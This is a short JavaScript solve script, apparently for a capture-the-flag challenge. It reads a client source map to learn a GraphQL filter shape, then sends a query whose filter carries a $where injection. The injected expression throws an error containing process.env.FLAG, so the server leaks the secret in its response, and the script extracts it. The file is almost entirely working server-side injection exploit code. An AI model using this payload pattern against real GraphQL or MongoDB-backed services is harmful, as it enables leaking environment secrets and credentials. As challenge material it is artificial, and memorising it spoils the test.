const baseUrl = (process.env.CHALLENGE_URL ?? 'http://127.0.0.1:18081').replace(/\/$/, '');

const script = await fetch(`${baseUrl}/assets/explorer.js`);
if (!script.ok || !/sourceMappingURL=explorer\.js\.map/.test(await script.text())) throw new Error('client source map clue not found');
const map = await fetch(`${baseUrl}/assets/explorer.js.map`);
const mapText = JSON.stringify(await map.json());
if (!/filter\.tasks/.test(mapText)) throw new Error('resolver filter shape not found');

const query = 'query TaskGroupSearch($filter: JSON) { taskGroups(filter: $filter) { edges { node { taskGroupId name state } } } }';
const response = await fetch(`${baseUrl}/graphql`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    query,
    variables: {
      filter: {
        tasks: {
          $where: "(()=>{throw new Error(process.env.FLAG)})()",
        },
      },
    },
  }),
});
const body = await response.json();
const flag = /flag\{[^\r\n}]+\}/i.exec(JSON.stringify(body))?.[0];
if (!response.ok || !flag) throw new Error(`exploit failed (${response.status}): ${JSON.stringify(body)}`);
console.log(flag);
